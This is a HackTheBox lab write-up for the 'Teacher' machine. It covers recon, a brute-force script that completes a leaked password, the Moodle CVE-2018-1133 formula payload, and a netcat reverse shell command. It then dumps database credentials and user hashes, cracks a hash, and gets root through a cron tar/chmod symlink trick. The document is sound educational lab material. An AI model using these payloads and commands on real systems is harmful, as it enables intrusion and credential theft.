---
layout: menu
title: "HTB Teacher"
description: "10.10.10.153 | 20 pts"
header-img: "boxes/screenshots/19_teacher/teacher.png"
tags: [hackthebox, htb, boot2root, writeup, write-up, linux, rce, remote-code-execution, moodle]
---

# <span style="color:red">HTB Teacher (10.10.10.153) MACHINE WRITE-UP</span>

---

### TABLE OF CONTENTS

* [PART 1 : INITIAL RECON](#part-1--initial-recon)
* [PART 2 : PORT ENUMERATION](#part-2--port-enumeration)
  * [TCP PORT 80 (http)](#tcp-port-80-http)
* [PART 3 : EXPLOITATION](#part-3--exploitation)
* [STEP 4 : PRIVILEGE ESCALATION (giovanni -&gt; root)](#step-4--privilege-escalation-giovanni---root)

---

## PART 1 : INITIAL RECON

```console
$ nmap --min-rate 1000 -p- -v 10.10.10.153

  PORT   STATE SERVICE
  80/tcp open  http

$ nmap -oN teacher.nmap -p 80 -sC -sV -v 10.10.10.153

  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.25 ((Debian))
  | http-methods:
  |_  Supported Methods: OPTIONS HEAD GET POST
  |_http-server-header: Apache/2.4.25 (Debian)
  |_http-title: Blackhat highschool

```
---

## PART 2 : PORT ENUMERATION

### TCP PORT 80 (http)
  
- Landing Page:
    
  ![Landing Page](./screenshots/19_teacher/80_teacher_home.png)

- Check __GALLERY__ [(__*/gallery.html*__)](http://10.10.10.153/gallery.html#)

  ![Gallery Page](./screenshots/19_teacher/80_teacher_gallery.png)

  __NOTE(S)__:
  - One of the images failed to load
    ```html
    <a href="#"><img src="images/5.png" onerror="console.log('That\'s an F');" alt=""></a>
    ```
> 
- Open the image using `curl`
  ```console
  $ curl http://10.10.10.153/images/5.png

    Hi Servicedesk,

    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

    Could you guys figure out what the last charachter is, or just reset it?

    Thanks,
    Giovanni

  ```
  __NOTE(S)__:
  - An incomplete password was given for __Giovanni__
  - Where to use the credentials is stil unknown
>
- __`gobuster`__ on __`http://10.10.10.153/`__:
  ```console
  $ gobuster -u http://10.10.10.153 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

    /images (Status: 301)
    /css (Status: 301)
    /manual (Status: 301)
    /js (Status: 301)
    /javascript (Status: 301)
    /fonts (Status: 301)
    /phpmyadmin (Status: 403)
    /moodle (Status: 301)

  ```

- __`http://10.10.10.153/moodle/`__:
  
  ![Moodle Home](./screenshots/19_teacher/80_teacher_moodle.png)

  - Login Page:
    
    ![Moodle Login](./screenshots/19_teacher/80_teacher_moodle_login.png)

---

## PART 3 : EXPLOITATION

1. Complete __giovanni__'s password:
   - __*moodle_login.py*__
     ```py
     import requests as r

     characters = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()"
     for i in characters:
    
         creds = {
             "username": "Giovanni",
             "password": "Th4C00lTheacha" + i
         }
    
         req = r.post("http://10.10.10.153/moodle/login/index.php", data=creds)

         err_message = "Invalid login"
         if err_message not in req.text: 
     
             print("PASSWORD: " + creds["password"])
             break
     ```
   - Run the python script
     ```console
     $ python3 moodle_login.py

       PASSWORD: Th4C00lTheacha# 

     ```

2. Login to __moodle__ using __`giovanni : Th4C00lTheacha#`__:
   1. Set-up moodle exploit -- __Evil Teacher__ ([CVE-2018-1133](https://blog.ripstech.com/2018/moodle-remote-code-execution/]))
      1. Select a quiz
      2. Click __Edit quiz__
      3. Add a new question
         1. Select __Calculated__ then __Add__
         2. Fill up the required fields:
            - Question name: \<ANYTHING GOES HERE\>
            - Question text: \<ANYTHING GOES HERE\>
            - Answer 1 Formula: `/*{a*/`$_GET[cmd]`;//{x}}`
            - Grade: 100%
      4. Click __Save changes__
      5. Click __Next page__
   2. Set-up local netcal listener 
      ```console
      $ nc -lvp 4444
      ```
   3. Append `&cmd=(date; nc <HTB IPv4> 4444 -e /bin/bash)` to URL
   4. Submit the URL

3. While inside the shell:
   ```console
   $ id
   


   $ python -c 'import pty; pty.spawn("/bin/bash")'
 
   $ cat /etc/passwd | grep bash

     root:x:0:0:root:/root:/bin/bash
     giovanni:x:1000:1000:Giovanni,1337,,:/home/giovanni:/bin/bash

   $ find /var/www -name *conf* 2> /dev/null

     ...omitted...
     /var/www/html/moodle/config.php
     ...omitted...

   $ cat /var/www/html/moodle/config.php
   ```
   - __`/var/www/html/moodle/config.php`__:
     ```php
     <?php  // Moodle configuration file

     unset($CFG);
     global $CFG;
     $CFG = new stdClass();

     $CFG->dbtype    = 'mariadb';
     $CFG->dblibrary = 'native';
     $CFG->dbhost    = 'localhost';
     $CFG->dbname    = 'moodle';
     $CFG->dbuser    = 'root';
     $CFG->dbpass    = 'Welkom1!';
     $CFG->prefix    = 'mdl_';
     $CFG->dboptions = array (
       'dbpersist' => 0,
       'dbport' => 3306,
       'dbsocket' => '',
       'dbcollation' => 'utf8mb4_unicode_ci',
     );

     $CFG->wwwroot   = 'http://10.10.10.153/moodle';
     $CFG->dataroot  = '/var/www/moodledata';
     $CFG->admin     = 'admin';

     $CFG->directorypermissions = 0777;

     require_once(__DIR__ . '/lib/setup.php');

     // There is no php closing tag in this file,
     // it is intentional because it prevents trailing whitespace problems!
     ```
   - __MariaDB CLI__:
     ```console
     $ mariadb -uroot -pWelkom1!

     $ MariaDB [(none)]> SHOW databases;

       +--------------------+
       | Database           |
       +--------------------+
       | ...omitted...      |
       | moodle             |
       | ...omitted...      |
       +--------------------+

     $ MariaDB [(none)]> USE moodle

     $ MariaDB [moodle]> SHOW tables;
    
       +----------------------------------+
       | Tables_in_moodle                 |
       +----------------------------------+
       | ...omitted...                    |
       | mdl_user                         |
       | ...omitted...                    |
       +----------------------------------+

     $ MariaDB [moodle]> SELECT * FROM mdl_user;
   
       +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
       | id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |
       +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+
       |    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |   |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |  |       0 |     | This user is a special user that allows read-only access to some courses. | 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |    0 | NULL     | NULL             | NULL              | NULL       | NULL          |
       |    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |   |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |  |       0 |     |                                                                           | 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |    0 | NULL     |                  |                   |            |               |
       |    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |   |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1555841309 | 1555840529 |   1555840557 | 10.10.15.36   |  |       0 |     |                                                                           | 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |    0 |          |                  |                   |            |               |
       | 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |   |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |  |       0 |     | NULL                                                                      | 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |    0 | NULL     | NULL             | NULL              | NULL       | NULL          |
       +------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+

     $ MariaDB [moodle]> \q
     ```
     __NOTE(S)__:
     - The user __Giovannibak__ has a different password hash than the rest
     - __Giovannibak__'s password is in __MD5__
>
   - Decrypt __Giovannibak__'s password:
     ```console
     $ hashcat --force -m0 7a860966115182402ed06375cf0a22af /usr/share/wordlists/rockyou.txt

       7a860966115182402ed06375cf0a22af:expelled

     ```
   - Go back to __`www-data`__ shell: 
     ```console
     $ su giovanni
     $ Password: expelled

     $ id

       uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)
     
     $ cat ~/user.txt

       fa9ae187462530e841d9e61936648fa7

     ```

---

## STEP 4 : PRIVILEGE ESCALATION (giovanni -> root)

1. Download, upload, then run [pspy](https://github.com/DominicBreuker/pspy):
   1. Check system architecture of FriendZone
      ```console
      $ uname -mnop

        teacher x86_64 unknown GNU/Linux

      ```
      __NOTE(S)__:
      - The system runs on 64-bit.
>
   2. Upload [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64) to Teacher
      - Local terminal:
        ```console
        $ python -m SimpleHTTPServer

          Serving HTTP on 0.0.0.0 port 8000 ...

        ```
      - __`giovanni`__ shell:
        ```console
        $ wget -O /tmp/pspy64 http://<HTB IPv4>:8000/pspy64

          ‘/tmp/pspy64’ saved [4468984/4468984]
        
        $ chmod +x /tmp/pspy64
        
        $ ./pspy64

          ...omitted...
          04:01 CMD: UID=0    PID=1342   | /bin/bash /usr/bin/backup.sh
          ...omitted...
          05:01 CMD: UID=0    PID=1354   | /bin/bash /usr/bin/backup.sh
          ...omitted...
          06:01 CMD: UID=0    PID=1375   | /bin/bash /usr/bin/backup.sh
          ...omitted...

        ```
        __NOTE(S)__:
        - There is a script called __*backup.sh*__
        - It runs every minute
>
2. Examine __*/usr/bin/backup.sh*__
   - __`backup.sh`__:
     ```sh
     #!/bin/bash
     cd /home/giovanni/work;
     tar -czvf tmp/backup_courses.tar.gz courses/*;
     cd tmp;
     tar -xf backup_courses.tar.gz;
     chmod 777 * -R;
     ```

   __NOTE(S)__:
   - The script is being ran by __root__ periodically
   - Contents of the `courses/` directory are compressed
     - The compressed file is saved in `~/work/tmp`
   - The compressed file is decompressed on where it is saved
   - The first __tar__ and __chmod__ use wildcards ("__*__")
   - Everything inside `~/work/tmp` will have its permissions changed
>
4. Exploit __*/usr/bin/backup.sh*__:
   ```console
   $ cd /home/giovanni/work

   $ rm -rf tmp

   $ ln -s / ./tmp
   ```
   - after __*backup.sh*__ runs:
     ```console
     $ cat /root/root.txt

       4f3a83b42ac7723a508b8ace7b8b1209

     ```

   __NOTE(S)__:
   - `~/work/tmp` was changed to have a symbolic link to `/`
   - Now, everything inside `/` has `-rwxrwxrwx`permissions
